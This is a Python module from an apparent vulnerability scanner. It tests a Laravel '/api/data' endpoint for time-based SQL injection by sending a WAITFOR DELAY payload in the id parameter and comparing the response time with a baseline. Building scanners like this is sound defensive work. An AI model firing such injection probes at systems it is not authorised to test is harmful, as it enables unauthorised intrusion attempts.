#!/usr/bin/env python3
"""
Time-based SQL Injection Scanner for Laravel API Endpoints

This module detects time-based SQL injection vulnerabilities by measuring
response time delays when injecting time-delay SQL payloads into API parameters.
"""

import requests
import time
from urllib.parse import urljoin, quote
from typing import Dict, List, Optional, Union

from modules.core.http_config import app_url
from modules.core import http_config


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs) -> Optional[Dict[str, Union[str, float]]]:
    """
    Scan for time-based SQL injection vulnerability in Laravel API endpoints.
    
    Args:
        target_url (str): The target URL to scan
        
    Returns:
        Optional[Dict]: Dictionary with vulnerability details if found, None otherwise
        Format: {"path": "/api/data", "url": "https://example.com/api/data?id=1'+WAITFOR+DELAY+'0:0:5--", "delay": 5.3}
    """
    if not target_url:
        return None

    sess = session or http_config.get_auth_session()

    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Remove trailing slash for consistent path joining
    target_url = target_url.rstrip('/')
    
    # API endpoint to test
    api_path = '/api/data'
    
    # Request headers
    headers = {
        'User-Agent': http_config.BROWSER_USER_AGENT,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    
    try:
        # Step 1: Get baseline response time
        baseline_url = app_url(target_url, api_path) + '?id=1'
        baseline_time = _measure_response_time(baseline_url, headers, sess)

        if baseline_time is None:
            return None

        # Step 2: Test with time-delay SQL injection payload
        payload = "1'+WAITFOR+DELAY+'0:0:5'--"
        injection_url = app_url(target_url, api_path) + f'?id={quote(payload)}'
        injection_time = _measure_response_time(injection_url, headers, sess)
        
        if injection_time is None:
            return None
        
        # Step 3: Calculate delay difference
        delay_difference = injection_time - baseline_time
        
        # Step 4: Check if delay indicates SQL injection vulnerability
        if delay_difference >= 4.5:
            return {
                "path": api_path,
                "url": injection_url,
                "delay": delay_difference,
                "baseline_time": baseline_time,
                "injection_time": injection_time
            }
            
    except Exception:
        # Silently handle any errors
        pass
    
    return None


def _measure_response_time(url: str, headers: Dict[str, str], sess) -> Optional[float]:
    """
    Measure response time for a given URL.

    Args:
        url (str): The URL to test
        headers (Dict[str, str]): Request headers
        sess: The requests session used to issue the request

    Returns:
        Optional[float]: Response time in seconds, None if request failed
    """
    try:
        start_time = time.time()

        response = sess.get(
            url,
            headers=headers,
            timeout=15,  # Higher timeout to allow for injection delays
            allow_redirects=False
        )
        
        end_time = time.time()
        return end_time - start_time
        
    except Exception:
        return None










